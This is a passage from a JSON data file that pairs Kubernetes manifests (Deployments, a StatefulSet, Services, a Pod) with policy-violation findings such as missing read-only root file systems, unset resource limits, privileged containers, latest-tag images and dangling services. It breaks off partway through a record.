  {
    "id": "11585",
    "manifest_path": "data/manifests/the_stack_sample/sample_4468.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: book-import\n  name: book-import\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: book-import\n  template:\n    metadata:\n      labels:\n        name: book-import\n    spec:\n      containers:\n      - image: quay.io/jpacker/hugo-nginx:latest\n        name: book-import\n        ports:\n        - containerPort: 8080\n          name: http-server\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11586",
    "manifest_path": "data/manifests/the_stack_sample/sample_4468.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: book-import\n  name: book-import\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: book-import\n  template:\n    metadata:\n      labels:\n        name: book-import\n    spec:\n      containers:\n      - image: quay.io/jpacker/hugo-nginx:latest\n        name: book-import\n        ports:\n        - containerPort: 8080\n          name: http-server\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"book-import\" does not have a read-only root file system"
  },
  {
    "id": "11587",
    "manifest_path": "data/manifests/the_stack_sample/sample_4468.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: book-import\n  name: book-import\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: book-import\n  template:\n    metadata:\n      labels:\n        name: book-import\n    spec:\n      containers:\n      - image: quay.io/jpacker/hugo-nginx:latest\n        name: book-import\n        ports:\n        - containerPort: 8080\n          name: http-server\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"book-import\" is not set to runAsNonRoot"
  },
  {
    "id": "11588",
    "manifest_path": "data/manifests/the_stack_sample/sample_4468.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: book-import\n  name: book-import\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: book-import\n  template:\n    metadata:\n      labels:\n        name: book-import\n    spec:\n      containers:\n      - image: quay.io/jpacker/hugo-nginx:latest\n        name: book-import\n        ports:\n        - containerPort: 8080\n          name: http-server\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"book-import\" has cpu request 0"
  },
  {
    "id": "11589",
    "manifest_path": "data/manifests/the_stack_sample/sample_4468.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: book-import\n  name: book-import\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: book-import\n  template:\n    metadata:\n      labels:\n        name: book-import\n    spec:\n      containers:\n      - image: quay.io/jpacker/hugo-nginx:latest\n        name: book-import\n        ports:\n        - containerPort: 8080\n          name: http-server\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"book-import\" has memory limit 0"
  },
  {
    "id": "11590",
    "manifest_path": "data/manifests/the_stack_sample/sample_4469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: mysql\n  name: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n        workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n    spec:\n      affinity: {}\n      containers:\n      - image: mysql:5.6\n        imagePullPolicy: Always\n        name: container-0\n        ports:\n        - containerPort: 3306\n          name: 3306tcp\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: vol0\n        envFrom:\n        - secretRef:\n            name: mysql-secret\n      volumes:\n      - name: vol0\n        persistentVolumeClaim:\n          claimName: object-storage-mysql5.6\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container-0\" does not have a read-only root file system"
  },
  {
    "id": "11591",
    "manifest_path": "data/manifests/the_stack_sample/sample_4469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: mysql\n  name: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n        workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n    spec:\n      affinity: {}\n      containers:\n      - image: mysql:5.6\n        imagePullPolicy: Always\n        name: container-0\n        ports:\n        - containerPort: 3306\n          name: 3306tcp\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: vol0\n        envFrom:\n        - secretRef:\n            name: mysql-secret\n      volumes:\n      - name: vol0\n        persistentVolumeClaim:\n          claimName: object-storage-mysql5.6\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container-0\" is not set to runAsNonRoot"
  },
  {
    "id": "11592",
    "manifest_path": "data/manifests/the_stack_sample/sample_4469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: mysql\n  name: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n        workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n    spec:\n      affinity: {}\n      containers:\n      - image: mysql:5.6\n        imagePullPolicy: Always\n        name: container-0\n        ports:\n        - containerPort: 3306\n          name: 3306tcp\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: vol0\n        envFrom:\n        - secretRef:\n            name: mysql-secret\n      volumes:\n      - name: vol0\n        persistentVolumeClaim:\n          claimName: object-storage-mysql5.6\n      securityContext: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container-0\" has cpu request 0"
  },
  {
    "id": "11593",
    "manifest_path": "data/manifests/the_stack_sample/sample_4469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: mysql\n  name: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n        workload.user.cattle.io/workloadselector: apps.statefulset-default-mysql\n    spec:\n      affinity: {}\n      containers:\n      - image: mysql:5.6\n        imagePullPolicy: Always\n        name: container-0\n        ports:\n        - containerPort: 3306\n          name: 3306tcp\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: vol0\n        envFrom:\n        - secretRef:\n            name: mysql-secret\n      volumes:\n      - name: vol0\n        persistentVolumeClaim:\n          claimName: object-storage-mysql5.6\n      securityContext: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container-0\" has memory limit 0"
  },
  {
    "id": "11594",
    "manifest_path": "data/manifests/the_stack_sample/sample_4471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: driver\n  template:\n    metadata:\n      labels:\n        app: driver\n    spec:\n      containers:\n      - image: DOCKERHUB/driver.backend.driver:0.0.52\n        name: driver\n        volumeMounts:\n        - name: google-application-credentials\n          mountPath: /etc/GOOGLE_APPLICATION_CREDENTIALS\n          readOnly: true\n        resources:\n          requests:\n            cpu: 50m\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/GOOGLE_APPLICATION_CREDENTIALS/gcloud-service-key.json\n        - name: EVENT_STORE_BROKER_TYPE\n          value: PUBSUB\n        - name: EVENT_STORE_BROKER_EVENTS_TOPIC\n          value: events\n        - name: EVENT_STORE_STORE_TYPE\n          value: MONGO\n        - name: EVENT_STORE_STORE_URL\n          value: mongodb://dbevents-0.dbevents:27017,dbevents-1.dbevents:27017,dbevents-2.dbevents:27017/test?replicaSet=rs0\n        - name: EVENT_STORE_STORE_AGGREGATES_DB_NAME\n          value: Aggregates\n        - name: EVENT_STORE_STORE_EVENTSTORE_DB_NAME\n          value: EventStore\n        - name: MONGODB_URL\n          value: mongodb://driv-mongo:27017\n        - name: MONGODB_DB_NAME\n          value: driver\n        - name: JWT_PUBLIC_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: keycloak-jwt-public-key\n              key: jwt_public_key\n        - name: EMI-GATEWAY_REPLIES_TOPIC_SUBSCRIPTION\n          value: emi-gateway-replies-topic-mbe-driver\n        - name: REPLY_TIMEOUT\n          value: '2000'\n        - name: BROKER_TYPE\n          value: PUBSUB\n        - name: LOCKVERSION\n          value: initial_lock\n        - name: KEYCLOAK_BACKEND_BASE_URL\n          valueFrom:\n            configMapKeyRef:\n              name: environment-variables\n              key: keycloak-backend-base-url\n        - name: KEYCLOAK_BACKEND_USER\n          valueFrom:\n            secretKeyRef:\n              name: keycloak\n              key: keycloak_backend_user\n        - name: KEYCLOAK_BACKEND_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: keycloak\n              key: keycloak_backend_password\n        - name: KEYCLOAK_BACKEND_CLIENT_ID\n          value: admin-cli\n        - name: KEYCLOAK_BACKEND_REALM_NAME\n          value: TPI\n      volumes:\n      - name: google-application-credentials\n        secret:\n          secretName: google-application-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"driver\" does not have a read-only root file system"
  },
  {
    "id": "11595",
    "manifest_path": "data/manifests/the_stack_sample/sample_4471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: driver\n  template:\n    metadata:\n      labels:\n        app: driver\n    spec:\n      containers:\n      - image: DOCKERHUB/driver.backend.driver:0.0.52\n        name: driver\n        volumeMounts:\n        - name: google-application-credentials\n          mountPath: /etc/GOOGLE_APPLICATION_CREDENTIALS\n          readOnly: true\n        resources:\n          requests:\n            cpu: 50m\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/GOOGLE_APPLICATION_CREDENTIALS/gcloud-service-key.json\n        - name: EVENT_STORE_BROKER_TYPE\n          value: PUBSUB\n        - name: EVENT_STORE_BROKER_EVENTS_TOPIC\n          value: events\n        - name: EVENT_STORE_STORE_TYPE\n          value: MONGO\n        - name: EVENT_STORE_STORE_URL\n          value: mongodb://dbevents-0.dbevents:27017,dbevents-1.dbevents:27017,dbevents-2.dbevents:27017/test?replicaSet=rs0\n        - name: EVENT_STORE_STORE_AGGREGATES_DB_NAME\n          value: Aggregates\n        - name: EVENT_STORE_STORE_EVENTSTORE_DB_NAME\n          value: EventStore\n        - name: MONGODB_URL\n          value: mongodb://driv-mongo:27017\n        - name: MONGODB_DB_NAME\n          value: driver\n        - name: JWT_PUBLIC_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: keycloak-jwt-public-key\n              key: jwt_public_key\n        - name: EMI-GATEWAY_REPLIES_TOPIC_SUBSCRIPTION\n          value: emi-gateway-replies-topic-mbe-driver\n        - name: REPLY_TIMEOUT\n          value: '2000'\n        - name: BROKER_TYPE\n          value: PUBSUB\n        - name: LOCKVERSION\n          value: initial_lock\n        - name: KEYCLOAK_BACKEND_BASE_URL\n          valueFrom:\n            configMapKeyRef:\n              name: environment-variables\n              key: keycloak-backend-base-url\n        - name: KEYCLOAK_BACKEND_USER\n          valueFrom:\n            secretKeyRef:\n              name: keycloak\n              key: keycloak_backend_user\n        - name: KEYCLOAK_BACKEND_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: keycloak\n              key: keycloak_backend_password\n        - name: KEYCLOAK_BACKEND_CLIENT_ID\n          value: admin-cli\n        - name: KEYCLOAK_BACKEND_REALM_NAME\n          value: TPI\n      volumes:\n      - name: google-application-credentials\n        secret:\n          secretName: google-application-credentials\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"driver\" is not set to runAsNonRoot"
  },
  {
    "id": "11596",
    "manifest_path": "data/manifests/the_stack_sample/sample_4471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: driver\n  template:\n    metadata:\n      labels:\n        app: driver\n    spec:\n      containers:\n      - image: DOCKERHUB/driver.backend.driver:0.0.52\n        name: driver\n        volumeMounts:\n        - name: google-application-credentials\n          mountPath: /etc/GOOGLE_APPLICATION_CREDENTIALS\n          readOnly: true\n        resources:\n          requests:\n            cpu: 50m\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/GOOGLE_APPLICATION_CREDENTIALS/gcloud-service-key.json\n        - name: EVENT_STORE_BROKER_TYPE\n          value: PUBSUB\n        - name: EVENT_STORE_BROKER_EVENTS_TOPIC\n          value: events\n        - name: EVENT_STORE_STORE_TYPE\n          value: MONGO\n        - name: EVENT_STORE_STORE_URL\n          value: mongodb://dbevents-0.dbevents:27017,dbevents-1.dbevents:27017,dbevents-2.dbevents:27017/test?replicaSet=rs0\n        - name: EVENT_STORE_STORE_AGGREGATES_DB_NAME\n          value: Aggregates\n        - name: EVENT_STORE_STORE_EVENTSTORE_DB_NAME\n          value: EventStore\n        - name: MONGODB_URL\n          value: mongodb://driv-mongo:27017\n        - name: MONGODB_DB_NAME\n          value: driver\n        - name: JWT_PUBLIC_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: keycloak-jwt-public-key\n              key: jwt_public_key\n        - name: EMI-GATEWAY_REPLIES_TOPIC_SUBSCRIPTION\n          value: emi-gateway-replies-topic-mbe-driver\n        - name: REPLY_TIMEOUT\n          value: '2000'\n        - name: BROKER_TYPE\n          value: PUBSUB\n        - name: LOCKVERSION\n          value: initial_lock\n        - name: KEYCLOAK_BACKEND_BASE_URL\n          valueFrom:\n            configMapKeyRef:\n              name: environment-variables\n              key: keycloak-backend-base-url\n        - name: KEYCLOAK_BACKEND_USER\n          valueFrom:\n            secretKeyRef:\n              name: keycloak\n              key: keycloak_backend_user\n        - name: KEYCLOAK_BACKEND_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: keycloak\n              key: keycloak_backend_password\n        - name: KEYCLOAK_BACKEND_CLIENT_ID\n          value: admin-cli\n        - name: KEYCLOAK_BACKEND_REALM_NAME\n          value: TPI\n      volumes:\n      - name: google-application-credentials\n        secret:\n          secretName: google-application-credentials\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"driver\" has memory limit 0"
  },
  {
    "id": "11597",
    "manifest_path": "data/manifests/the_stack_sample/sample_4472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: querier\nspec:\n  ports:\n  - port: 80\n  selector:\n    name: querier\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:querier])"
  },
  {
    "id": "11598",
    "manifest_path": "data/manifests/the_stack_sample/sample_4473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-cpu-limit\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n    securityContext:\n      runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hello\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11599",
    "manifest_path": "data/manifests/the_stack_sample/sample_4473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-cpu-limit\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n    securityContext:\n      runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "11600",
    "manifest_path": "data/manifests/the_stack_sample/sample_4473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-cpu-limit\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n    securityContext:\n      runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "11601",
    "manifest_path": "data/manifests/the_stack_sample/sample_4473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-cpu-limit\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n    securityContext:\n      runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "11602",
    "manifest_path": "data/manifests/the_stack_sample/sample_4474.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api\n  labels:\n    app: api\nspec:\n  type: ClusterIP\n  selector:\n    app: api\n  ports:\n  - name: api\n    protocol: TCP\n    port: 3001\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:api])"
  },
  {
    "id": "11603",
    "manifest_path": "data/manifests/the_stack_sample/sample_4476.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: service-fiap-grupo26\n  namespace: mbaaso-grupo26\nspec:\n  selector:\n    name: deployment-fiap-grupo26\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:deployment-fiap-grupo26])"
  },
  {
    "id": "11604",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"smf-container\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "11605",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"smf-container\" is using an invalid container image, \"sufuf3/nextepc-build:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11606",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"smf-container\" does not have a read-only root file system"
  },
  {
    "id": "11607",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"smf-container\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "11608",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"smf-container\" is privileged"
  },
  {
    "id": "11609",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"smf-container\" is not set to runAsNonRoot"
  },
  {
    "id": "11610",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv6.conf.all.disable_ipv6\"."
  },
  {
    "id": "11611",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
